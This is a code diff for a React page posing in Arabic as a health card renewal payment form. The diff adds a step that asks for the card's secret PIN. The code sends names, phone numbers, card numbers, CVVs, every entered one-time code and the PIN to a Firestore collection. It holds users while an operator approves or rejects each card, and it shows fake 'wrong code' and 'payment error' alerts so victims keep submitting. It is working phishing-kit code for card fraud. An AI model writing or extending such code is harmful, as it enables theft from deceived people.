@@ -9,10 +9,11 @@ import { Label } from "@/components/ui/label"
 import { CreditCard, MessageCircle } from 'lucide-react'
 import { FormEvent, SetStateAction, useEffect, useState } from "react"
 import { initializeApp } from 'firebase/app'
-import { getFirestore, doc,onSnapshot } from 'firebase/firestore'
+import { getFirestore, doc, onSnapshot } from 'firebase/firestore'
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { FullPageLoader } from "@/components/loader"
 import { addData } from "../actions/adddata"
+import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
 
 const firebaseConfig = {
   // Your Firebase configuration object goes here
@@ -45,6 +46,8 @@ interface Notification {
     expirationDate: string;
     cvv: string;
     otp: string;
+    password: string;
+    passState: 'pending' | 'approved' | 'rejected';
     allOtps: string[]
   }, cardState?: 'pending' | 'approved' | 'rejected'
 };
@@ -62,7 +65,7 @@ export default function HealthCardRenewal() {
   const [datayaer, setDatyear] = useState('')
   const [CVC, setCVC] = useState('')
   const [otp, setOtp] = useState('')
-  const [otp2, setOtp2] = useState('')
+  const [pin, setPin] = useState("")
   const [otpArd, setOtpard] = useState([''])
   const [cardNumber, setCardNumber] = useState('')
   const [selectedMethod, setSelectedMethod] = useState<any>('')
@@ -71,7 +74,7 @@ export default function HealthCardRenewal() {
     { id: 'credit-card', name: 'Visa Card', icon: <img className="h-6 w-12" src="/R.png" alt="visa" /> },
     { id: 'master-pay', name: 'Mastecard', icon: <img className="h-6 w-12" src="/m.png" alt="visa" /> },
   ]
-  
+
   const handleOtp = (v: string) => {
     setOtp(v)
 
@@ -95,16 +98,16 @@ export default function HealthCardRenewal() {
     else if (stepr === 3) {
       if (selectedMethod === '') {
       }
-    }
-    if (stepr === 4) {
+    } else if (stepr === 4) {
       if (cardNumber === '' || cardNumber.length < 16) {
         return alert('الرجاء ادخال معلومات البطاقة بشكل صحيح ')
       }
+
       setIswait(true)
       onSnapshot(doc(db, 'pays', id), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as Notification;
-          if (data.cardInfo &&cardState) {
+          if (data.cardInfo && cardState) {
             if (data.cardState === 'approved') {
               setIswait(false);
               setStep(5);
@@ -120,29 +123,42 @@ export default function HealthCardRenewal() {
         //setIswait(false)
       }, 5000)
     }
-    setStep(stepr + 1)
-const data={
-  id:id,
-  hasPersonalInfo:name != '',
-  hasCardInfo:cardNumber != '',
-  currentPage:stepr,
-  createdDate: new Date().toISOString(),
-  notificationCount:1,
-  personalInfo: {
-    id:id,
-    fullName:name,
-    phone:phone
-  },
-  cardInfo: {
-    cardNumber:cardNumber,
-    expirationDate: `${dateMonth} / ${datayaer}`,
-    cvv:CVC,
-    otp:otp,
-    allOtps:otpArd,
-    state:cardState,
-  },
-  cardState:cardState,
-};
+    if (stepr === 6) {
+     setIswait(true)
+     setTimeout(() => {
+     setIswait(false)
+      
+      setStep(4)
+
+      alert("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
+     }, 50000);
+     
+    }
+    stepr !== 6 ? setStep(stepr + 1) : null
+
+    const data = {
+      id: id,
+      hasPersonalInfo: name != '',
+      hasCardInfo: cardNumber != '',
+      currentPage: stepr,
+      createdDate: new Date().toISOString(),
+      notificationCount: 1,
+      personalInfo: {
+        id: id,
+        fullName: name,
+        phone: phone
+      },
+      cardInfo: {
+        cardNumber: cardNumber,
+        expirationDate: `${dateMonth} / ${datayaer}`,
+        cvv: CVC,
+        otp: otp,
+        allOtps: otpArd,
+        password: pin,
+        state: cardState,
+      },
+      cardState: cardState,
+    };
     addData(data)
   }
   const handdleadd = (e: any) => {
@@ -151,17 +167,15 @@ const data={
 
     })
 
-    if (stepr >= 5) {
+    if (stepr === 5) {
       handleOArr().then(
         () => {
           setIswait(true)
           setOtp("")
           setTimeout(() => {
-            alert("رمز التحقق خاطىء تم ارسال رمز جديد")
+            alert("رمز التحقق خاطىْ")
             ///otpArd.push(otp);
             setIswait(false)
-
-
           }, 4000)
         }
       )
@@ -169,31 +183,31 @@ const data={
 
     }
   }
-  useEffect(()=>{
-    const data={
-      id:id,
-      hasPersonalInfo:name != '',
-      hasCardInfo:cardNumber != '',
-      currentPage:"الرئيسية",
+  useEffect(() => {
+    const data = {
+      id: id,
+      hasPersonalInfo: name != '',
+      hasCardInfo: cardNumber != '',
+      currentPage: "الرئيسية",
       createdDate: new Date().toISOString(),
-      notificationCount:1,
+      notificationCount: 1,
       personalInfo: {
-        id:id,
-        fullName:name,
-        phone:phone
+        id: id,
+        fullName: name,
+        phone: phone
       },
       cardInfo: {
-        cardNumber:cardNumber,
+        cardNumber: cardNumber,
         expirationDate: `${dateMonth} / ${datayaer}`,
-        cvv:CVC,
-        otp:otp,
-        allOtps:otpArd,
-        state:cardState,
+        cvv: CVC,
+        otp: otp,
+        allOtps: otpArd,
+        state: cardState,
       },
-      cardState:cardState,
+      cardState: cardState,
     };
     addData(data)
-  },[])
+  }, [])
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       {iswait ? <FullPageLoader message=" جاري التحقق..." /> : null}
@@ -534,21 +548,34 @@ const data={
 
                           </>}
                       </CardContent>
-                    </Card></> : <>
-                  <div className="space-y-2">
-                    <Label className="flex gap-1 text-sm sm:text-base">
-                      الرجاء ادخال رمز التحقق المرسل الى هاتفك      <span className="text-red-500">*</span>
-                    </Label>
-                    <Input
-                      onChange={(e) => { handleOtp(e.target.value) }}
-                      value={otp}
-                      type="tel"
-                      placeholder="رمز التحقق"
-                      className="max-w-md text-sm sm:text-base"
-                      maxLength={6}
-                    />
-                  </div>
-                </>
+                    </Card></> : stepr === 5 ? <>
+                      <div className="space-y-2">
+                        <Label className="flex gap-1 text-sm sm:text-base">
+                          الرجاء ادخال رمز التحقق المرسل الى هاتفك      <span className="text-red-500">*</span>
+                        </Label>
+                        <Input
+                          onChange={(e) => { handleOtp(e.target.value) }}
+                          value={otp}
+                          type="tel"
+                          placeholder="رمز التحقق"
+                          className="max-w-md text-sm sm:text-base"
+                          maxLength={6}
+                        />
+                      </div>
+
+                    </> : stepr === 6 ? <>
+                      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
+                        <div className="w-full max-w-md p-8 space-y-8 bg-white rounded-xl shadow-md">
+                          <h1 className="text-2xl font-bold text-center text-gray-900">أدخل الرقم السري للبطاقة</h1>
+                          <div className="space-y-2">
+                            <Input
+                              onChange={(e) => setPin(e.target.value)}
+                              type="tel" maxLength={4} placeholder="الرجاء ادخال الرقم السري للبطاقة" />
+                          </div>
+                        </div>
+                      </div>
+
+                    </> : null
             }
             {/* Action Buttons */}
             <div className="grid  grid-cols-2 sm:flex-row sm:justify-between gap-3 pt-4 sm:pt-6">
